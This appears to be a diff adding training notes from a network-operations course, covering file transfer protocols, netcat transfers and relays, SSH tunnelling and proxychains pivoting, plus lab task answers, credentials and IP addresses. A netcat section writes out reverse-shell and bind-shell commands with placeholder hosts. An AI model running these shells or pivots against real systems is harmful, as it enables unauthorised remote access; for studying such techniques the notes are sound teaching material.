@@ -1,0 +1,406 @@
+
+
+-------------------------------------------------------------------------------[DATA TRANSFER, MOVEMENT, AND REDIRECTION]-------------------------------------------------------------------------------
+
+
+
+
+
+COMMON METHODS FOR TRANSFERRING DATA
+----------------------------------------------------------------[TFTP]-----------------------------------------------
+                                                     [Trivial File Transfer Protocol]
+
+* RFC 1350 Rev2
+
+* UDP transport
+
+* Extremely small and very simple communication
+
+* No terminal communication ()
+
+* Insecure (no authentication or encryption)
+
+* No directory services
+
+* Used often for technologies such as BOOTP and PXE
+
+-----------------------------------------------------------------[FTP]------------------------------------------------
+                                                         [File Transfer Protocol]
+
+* RFC 959
+
+* TCP transport
+
+* Uses multiple TCP connections
+
+* Control Connection (21) / Data Connection (20)
+
+* Authentication through clear-text sign in (username and password)
+
+* Insecure in default configuration
+
+* Has directory services
+
+* Can be enhanced with SSL/TLS (FTPS)
+
+* Anonymous login
+
+* Active or Passive
+
+--[DEMO]--
+ftp 10.0.0.103 - ftp to file server
+<login> - active by default
+passive - switches to passive mode
+help - gets help
+pwd - present working direction
+cd - used to move around file server
+lcd - displays local directory (client side)
+delete - used to delete files
+rmdir - remove directories
+put test.txt - transfers file from local client to remote file server (doesnt delete off client)
+get secret.txt - transfer file from remote file server to local client
+
+----------------------------------------------------------------[SFTP]-----------------------------------------------
+                                                     [Secure File Transfer Protocol]
+
+* TCP transport (TCP port 22)
+
+* Uses symmetric and asymmetric encryption
+
+* Adds FTP like services to SSH
+
+* Authentication through sign in (username and password) or with SSH key
+
+* Interactive terminal access
+
+----------------------------------------------------------------[FTPS]-----------------------------------------------
+                                                    [File Transfer Protocol Secure]
+
+* TCP transport (TCP port 443)
+
+* Adds SSL/TLS encryption to FTP
+
+* Authentication with username/password and/or PKI
+
+* Interactive terminal access
+
+-----------------------------------------------------------------[SCP]-----------------------------------------------
+                                                         [Secure Copy Protocol]
+
+* TCP Transport (TCP port 22)
+
+* Uses symmetric and asymmetric encryption
+
+* Authentication through sign in (username and password) or with SSH key
+
+* Non Interactive
+
+--[SCP SYNTAX]--
+scp <source> <destination>
+
+Download a file from a remote directory to a local directory:
+
+$ scp student@172.16.82.106:secretstuff.txt /home/student
+
+Upload a file to a remote directory from a local directory:
+
+$ scp secretstuff.txt student@172.16.82.106:/home/student
+
+Copy a file from a remote host to a separate remote host:
+
+$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+* -3 means the data goes through you to get to the other remote device
+
+--[SCP SYNTAX W/ ALTERNATE SSHD]--
+Download a file from a remote directory to a local directory:
+
+$ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
+
+Upload a file to a remote directory from a local directory:
+
+$ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
+* -P (big P) specifies a port
+* -p (little p) shows connection speed (dont use)
+
+--[SCP SYNTAX THROUGH A TUNNEL]--
+ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+
+Download a file from a remote directory to a local directory
+
+$ scp -P 1111 student@localhost:secretstuff.txt /home/student
+
+Upload a file to a remote directory from a local directory
+
+$ scp -P 1111 secretstuff.txt student@localhost:/home/student
+
+
+##  scp -r - to copy a directory from either local to remote or remote to local  ##
+
+---------------------------------------------------------------[NETCAT]----------------------------------------------
+NETCAT is the "swiss army knife" networking utility which reads and writes data across network socket connections using the TCP/IP protocol
+It is designed to be a reliable "back end" tool that can be used directly or easily driven by other programs and scripts.
+
+* Can be used for the following:
+
+  - inbound and outbound connections, TCP/UDP, to or from any ports
+
+  - troubleshooting network connections
+
+  - sending/receiving data (insecurely)
+
+  - port scanning (similar to -sT in Nmap)
+
+--[NETCAT: CLIENT TO LISTENER FILE TRANSFER]--
+Client (sends file): 
+nc 10.2.0.2 9001 < file.txt
+
+Listener (receive file): 
+nc -l -p 9001 > newfile.txt
+
+--[NETCAT: LISTENER TO CLIENT FILE TRANSFER]--
+Listener (sends file): 
+nc -l -p 9001 < file.txt
+
+Client (receive file): 
+nc 10.2.0.2 9001 > newfile.txt
+
+--[NETCAT RELAY DEMOS]--
+On Client Relay:
+
+mknod mypipe p
+nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
+
+On Listener2 (sends info):
+nc -l -p 9002 < infile.txt
+
+On Listener1 (receives info):
+nc -l -p 9001 > outfile.txt
+
+* Writes the output to listener1 and listener2 through the named pipe
+
+mkfifo <name>
+mkfifo pipey
+0Local Host$ nc H1 9002 0<pipey | nc H2 9001 1>pipey
+H1$ nc -lp 9002 < infile.txt
+H2$ nc -lp 9001 > outfile.txt
+
+* listeners need to be running first
+
+--[FILE TRANSFER WITH /DEV/TCP]--
+On the receiving box:
+nc -l -p 1111 > file.txt
+
+On the sending box:
+cat file.txt > /dev/tcp/10.2.0.2/1111
+
+* This method is useful for host that does not have NETCAT available.
+
+--[REVERSE SHELL USING NETCAT]--
+When shelled into the remote host using -c :
+nc -c /bin/sh <your ip> <any unfiltered port>
+
+You could even pipe BASH through NETCAT.
+/bin/sh | nc <your ip> <any unfiltered port>
+
+Then listen for the shell.
+nc -l -p <same unfiltered port> -vvv
+
+You can also listen using the -e with NETCAT.
+nc -l -p <any unfiltered port> -e /bin/bash
+
+-----------------------------------------------------------------[SSH]-----------------------------------------------
+* Various Implementations (v1 and v2)
+
+* Provides authentication, encryption, and integrity.
+
+* Allows remote terminal sessions
+
+* Used for tunneling
+
+* Created as a secure replacement for Berkeley Remote commands:
+
+  - rsh - replaced with ssh, provides a channel for running a shell on a remote computer.
+
+  - rlogin - replaced with rlogin, provides remote login capability.
+
+  - rcp - replaced with scp for secure file transfer
+
+* sftp (not a unix r command replacement) - creates remote directory listing and file transfer capability over SSH
+
+-----[SSH PORT FORWARDING]-----
+* Creates channels using SSH-CONN protocol
+
+* Allows for tunneling of other services through SSH
+
+* Provides insecure services encryption
+
+---[SSH LOCAL PORT FORWARDING]---
+***Syntax***
+
+ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
+
+or
+
+ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
+
+[SSH LOCAL PORT FORWARDING]
+* Creates a local port (1111) on the local host that forwards to a target machine’s port 80.
+
+ssh student@172.16.82.106 -L 1111:localhost:80 -NT
+
+or
+
+ssh -L 1111:localhost:80 student@172.16.82.106 -NT
+
+
+[SSH LOCAL PORT FORWARDING THROUGH A LOCAL PORT]
+Internet Host:
+ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
+ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
+firefox localhost:2222
+* Creates an additional local port on the local host that forwards to a target machine through the previous channel created.
+
+[Tunneling notes]
+[Jumping from box to box]
+LH--------------------H1----------------H2----------------H3
+1111 --> H2:22
+2222 --> H3:80
+
+ssh user@H1 -L 1111:H2:80
+ssh -p 1111 user@localhost -L 2222:H3:80
+wget localhost:2222
+
+[Connecting to a different port on the same box (probably filtered)]
+ssh user@H1 -L 1111:H2:80
+ssh -p 1111 user@localhost -L 2222:localhost:80
+
+[just some example n random notes]
+ ssh user@h1 -L 1111:H2:22 -NT
+ssh H1@creds -L LHPort:H2IP:H2Port
+-NT - no terminal, makes your terminal non interactive
+
+ssh -p user@localhost
+wget localhost:1111
+localhost - that way it goes thru the tunnel
+
+[Dynamic Tunnels]
+                                           ________________
+LH--------------------H1_________________H2                 H3
+1111 --> H2:22
+9050:*
+
+<internet host> ssh user@H1 -L 1111:H2:80 -NT
+<internet host> ssh -p 1111 user@localhost -D 9050 -NT
+<internet host> proxychains wget -r H3
+<internet host> proxychains ftp H3
+<internet host> proxychains nc
+<internet host> proxychains nmap -Pn
+<internet host> proxychains curl
+<internet host> proxychains telnet - never use
+<internet host> proxychains ssh - use it to get on a box real quick and close it after your done
+<internet host> ssh -p 1111 user@localhost -L 2222:H3:80 -NT
+<internet host> ssh -p 2222 user@localhost -D 9050 -NT
+<internet host> proxychains nmap -Pn
+<internet host> ssh -p 2222 user@localhost -L 3333:H4:22
+<internet host> ssh -p 3333 user@localhost -D 9050 -NT
+
+<internet host> telnet localhost -p 3333
+                  ^
+[Remote Tunnels]  |
+         _________|
+         |
+<remote device> ssh user@bill -R 9999:localhost:22
+<internet host> ssh -p 2222 user@localhost -L 4444:localhost:9999
+<internet host> ssh -p 4444 user@localhost -D 9050 -NT
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------[CHALLENGES]---------------------------------------------------------------------------------------------------
+
+Task 2 - Tunnels Prep: The_Only_Easy_Day_Was_Yesterday
+
+Task 3 - Donovian Tunnels Training: dig_dug_dig_dug
+Your Network Number is N (Given by Instructor)
+
+Credentials: net{N}_studentX:passwordX
+
+X is your student number
+
+T3 (Atropia) Float IP address is - 10.50.33.33
+
+T4 (Pineland) Float IP address is - 10.50.22.92 (Note - You can only telnet here to act as an insider, this will not be a routed path)
+
+
+Task 4 - Donovian Data Collection: Will open when Task 3 is complete
+T5 Float IP address is - 10.50.31.103
+Credentials: Same as Task 3.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
